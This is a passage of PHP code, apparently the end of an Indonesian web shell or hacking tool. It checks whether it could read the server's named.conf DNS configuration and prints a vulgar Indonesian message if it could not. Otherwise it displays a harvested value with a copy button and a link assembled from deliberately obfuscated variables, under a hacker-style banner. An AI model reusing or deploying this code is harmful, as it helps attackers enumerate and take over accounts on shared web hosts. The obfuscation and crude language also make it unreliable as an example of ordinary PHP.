...
if(!$read_named_conf)
{
echo "<h1>Gagal akses ngentod</h1><br><br> </pre></center>"; 
}
else
{
echo "<center>(Salin) gobbllookk<BR><BR></center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin klik disini</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '"><img class="wis"src="https://i.ibb.co/hgKSY0K/cooltext317065123408510.png"></a><br><br></center>'; ;}} ?></div> </div></center> </body> </html>